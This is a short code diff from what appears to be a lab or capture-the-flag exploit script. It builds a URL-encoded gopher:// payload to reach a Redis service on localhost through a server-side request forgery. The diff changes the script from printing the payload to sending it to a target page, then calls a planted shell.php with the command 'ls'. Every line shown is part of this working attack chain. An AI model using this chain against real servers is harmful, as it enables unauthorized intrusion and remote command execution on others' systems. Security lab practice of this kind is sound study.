@@ -45,9 +45,9 @@ save\r
 finalpayload = urllib.parse.quote("gopher://127.0.0.1:6379/_" + payload, safe='').replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
 
 
-print(finalpayload)
+# print(finalpayload)
 
-# print(requests.post('http://localhost/index.php', data={'url':finalpayload}).text)
+print(requests.post('http://ssrf.local.lab.io/index.php', data={'url':finalpayload}).text)
 
 
-# print(requests.get('http://localhost/shell.php?c=ls').text)
+print(requests.get('http://ssrf.local.lab.io/shell.php?c=ls').text)
